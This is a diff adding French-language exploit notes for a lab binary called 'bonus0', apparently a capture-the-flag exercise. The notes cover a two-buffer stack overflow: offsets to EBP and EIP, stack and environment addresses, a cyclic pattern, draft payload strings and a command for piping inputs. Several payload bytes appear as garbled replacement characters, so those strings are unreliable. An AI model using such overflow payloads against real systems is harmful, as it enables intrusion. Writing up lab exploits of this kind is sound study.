@@ -1,0 +1,51 @@
+Nous avons 2 buffers.
+
+Si on remplie les 2 par une grande chaine on a un overflow sur EBP, EIP.
+
+Overflow value:
+EBP = 5
+EIP = 9
+
+
+./bonus0
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaa
+
+./bonus0
+aaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+result:
+
+1st buffer = 26 octets
+2nd buffer = 20 octets
+
+Adrr of first buffer	=	0xbffff5b8 | ����
+Adrr of second buffer	=	0xbffff5cc | ����
+
+Addr of env var = 0016| 0xbffff648 --> 0xbffff6dc --> 0xbffff835 ("LC_PAPER=fr_FR.UTF-8")
+
+=========================================================================
+	Nop instructions
+				|	 |----- junk code
+				v    v
+first string = �����aaaa
+second string = Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6A
+=========================================================================
+
+first payload:
+string 1 = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+string 2 = aaaaaaaaaX���aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+string 2 = aaaaaaaaa����aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+string 2 = aaaaaaaaa5���aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+=========================================================================
+Pour ecrire dans l'entree standard via une commande utiliser cette syntax :
+(echo -e '1'; cat ) | (echo -e '2'; cat ) |./bonus0
+         ^					^
+		 |					|
+	second entree		premiere entree
+=========================================================================
+
+break for input: break *0x080484e6
